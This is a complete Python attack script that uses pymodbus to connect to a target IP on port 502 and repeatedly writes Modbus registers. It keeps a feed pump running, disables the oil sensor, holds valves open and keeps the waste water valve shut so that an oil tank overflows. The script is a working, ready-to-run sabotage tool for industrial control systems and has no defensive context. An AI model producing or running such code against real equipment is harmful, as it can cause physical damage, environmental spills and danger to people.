#!/usr/bin/env python3

import sys
from pymodbus.client import ModbusTcpClient

if len(sys.argv) != 2:
    print("Error: Incorrect arguments given")
    print("Usage: ./attack_oil_tank.py ip_address")
    sys.exit()

ip = sys.argv[1]

client = ModbusTcpClient(ip, port=502)
client.connect()

print('Setting registers to overflow oil tank')

while True:
    client.write_register(1, 1) # Keep the feed pump running
    client.write_register(2, 0) # Keep oil sensor off
    client.write_register(3, 1) # Keep the Outlet valve open
    client.write_register(4, 1) # Keep seperator vessel valve open
    client.write_register(8, 0) # Keep the waste water valve closed
